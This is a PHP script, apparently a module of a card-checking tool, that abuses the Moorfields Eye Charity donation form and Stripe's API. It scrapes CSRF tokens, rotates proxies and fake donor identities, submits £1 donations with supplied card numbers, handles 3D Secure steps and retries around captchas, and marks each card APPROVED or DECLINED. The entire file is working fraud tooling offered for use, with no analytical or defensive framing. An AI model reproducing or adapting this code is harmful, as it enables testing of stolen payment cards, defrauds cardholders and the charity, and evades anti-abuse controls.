<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://moorfieldseyecharity.org.uk/donation-single', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$freeform_payload = trim(strip_tags($this->getstr($r1->body, 'freeform_payload" value="', '"')));
$formHash = trim(strip_tags($this->getstr($r1->body, 'formHash" value="', '"')));
$CRAFT_CSRF_TOKEN = trim(strip_tags($this->getstr($r1->body, 'CRAFT_CSRF_TOKEN" value="', '"')));
$formReturnUrl = trim(strip_tags($this->getstr($r1->body, 'formReturnUrl" value="', '"')));

if (empty($freeform_payload) || empty($formHash) || empty($CRAFT_CSRF_TOKEN) || empty($formReturnUrl)) {
	$empty = 'First Request Tokens are Empty';

	goto start;
}

$data = 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F72c5b37d6%3B+stripe-js-v3%2F72c5b37d6&time_on_page='.rand(100000, 500000).'&key=pk_live_2n7uT5voWwX3yJCUtmKsMju200crtnwRze';

$r2 = $this->curlx->Post('https://api.stripe.com/v1/payment_methods', $data, null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$json_r2 = json_decode($r2->body);

if (isset($json_r2->error)) {
	$status = $this->response->ErrorHandler($json_r2->error);

	goto end;
}

if (!isset($json_r2->id)) {
	$empty = 'Stripe Token is Empty';

	goto start;
}

$pm = $json_r2->id;

$data = '------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="freeform_form_handle"


------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="freeform_payload"

'.$freeform_payload.'
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="formHash"

'.$formHash.'
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="action"

freeform/submit
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="CRAFT_CSRF_TOKEN"

'.$CRAFT_CSRF_TOKEN.'
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="freeform-action"

submit
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="formReturnUrl"

'.$formReturnUrl.'
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="amount"

1.00
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="reasonForGiving"

general
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="inMemoryOfName"


------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="specialOccasion"


------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="fundraisingEventName"


------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="message"


------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="giftaidIt"


------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="firstName"

'.$fake->first.'
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="lastName"

'.$fake->last.'
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="email"

'.$fake->email.'
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="phone"


------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="addressLine1"

Brewster Mail Station
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="addressLine2"

12 Main St Ste 1
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="city"

Brewster
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="county"


------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="postcode"

10509-6408
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="country"

United States
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="payment"

'.$pm.'
------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="postThankYouLetter"


------WebKitFormBoundarym66XBwrkCsFjIFJX
Content-Disposition: form-data; name="form_page_submit"

1
------WebKitFormBoundarym66XBwrkCsFjIFJX--';

$headers = [
	'authority: moorfieldseyecharity.org.uk',
	'accept: */*',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'cache-control: no-cache',
	'content-type: multipart/form-data; boundary=----WebKitFormBoundarym66XBwrkCsFjIFJX',
	'http_x_requested_with: XMLHttpRequest',
	'origin: https://moorfieldseyecharity.org.uk',
	'referer: https://moorfieldseyecharity.org.uk/donation-single',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'user-agent: Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.104 Mobile Safari/537.36',
	'x-requested-with: XMLHttpRequest'
];

$r3 = $this->curlx->Post('https://moorfieldseyecharity.org.uk/donation-single', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$client_secret = $this->getstr($r3->body, 'client_secret":"', '"');

if (!empty($client_secret)) {
	$pi_id = explode('_secret_', $client_secret)[0];

	$r4 = $this->curlx->Get('https://api.stripe.com/v1/payment_intents/'.$pi_id.'?key=pk_live_2n7uT5voWwX3yJCUtmKsMju200crtnwRze&is_stripe_sdk=false&client_secret='.$client_secret, null, $cookie, $server['proxy']);

	if (!$r4->success) goto start;

	if (strpos($r4->body, 'verify_challenge')) {
		$empty = 'Fourth Request Contains HCaptcha';

		goto start;
	}

	$json_r4 = json_decode($r4->body);

	if (isset($json_r4->last_payment_error)) {
		$status = $this->response->ErrorHandler($json_r4->last_payment_error);

		goto end;
	} elseif (isset($json_r4->error)) {
		$status = $this->response->ErrorHandler($json_r4->error);

		goto end;
	}

	if ($json_r4->status == 'succeeded') {
		$status = $this->response->Stripe($r4->body);

		goto end;
	}

	if ($json_r4->next_action->use_stripe_sdk->type == 'stripe_3ds2_fingerprint') {
		$data = 'source='.$json_r4->next_action->use_stripe_sdk->three_d_secure_2_source.'&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22'.base64_encode('{"threeDSServerTransID":"'.$json_r4->next_action->use_stripe_sdk->server_transaction_id.'"}').'%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22846%22%2C%22browserScreenWidth%22%3A%22412%22%2C%22browserTZ%22%3A%22300%22%2C%22browserUserAgent%22%3A%22'.urlencode($this->curlx->userAgent()).'%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_2n7uT5voWwX3yJCUtmKsMju200crtnwRze';

		$vbv = $this->curlx->Post('https://api.stripe.com/v1/3ds2/authenticate', $data, null, $cookie, $server['proxy']);

		if (!$vbv->success) goto start;

		$vbv_state = json_decode($vbv->body)->state;

		if ($vbv_state == 'failed' || $vbv_state == 'challenge_required') {
			$state = $vbv_state == 'failed' ? 'Authenticate Failed' : 'OTP Code Required';

			$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CVV CARD - 3D Secure - $state!"];

			goto end;
		}
	} elseif ($json_r4->next_action->use_stripe_sdk->type == 'three_d_secure_redirect') {
		if (isset($json_r4->next_action->use_stripe_sdk->stripe_js)) $this->curlx->Get($json_r4->next_action->use_stripe_sdk->stripe_js, null, $cookie, $server['proxy']);
	}

	$r5 = $this->curlx->Get('https://api.stripe.com/v1/payment_intents/'.$pi_id.'?key=pk_live_2n7uT5voWwX3yJCUtmKsMju200crtnwRze&is_stripe_sdk=false&client_secret='.$client_secret, null, $cookie, $server['proxy']);

	if (!$r5->success) goto start;

	if (strpos($r5->body, 'verify_challenge')) {
		$empty = 'Fifth Request Contains HCaptcha';

		goto start;
	}

	$json_r5 = json_decode($r5->body);

	if (isset($json_r5->last_payment_error)) {
		$status = $this->response->ErrorHandler($json_r5->last_payment_error);

		goto end;
	} elseif (isset($json_r5->error)) {
		$status = $this->response->ErrorHandler($json_r5->error);

		goto end;
	}

	file_put_contents('stc_r5.txt', $r5->body . PHP_EOL, FILE_APPEND);

	$status = $this->response->Stripe($r5->body);

	goto end;
}

$err = $this->getstr($r3->body, 'formErrors":["', '"]');

if (empty($err)) file_put_contents('stc_r3_err.txt', $r3->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r3->body, $err);

end: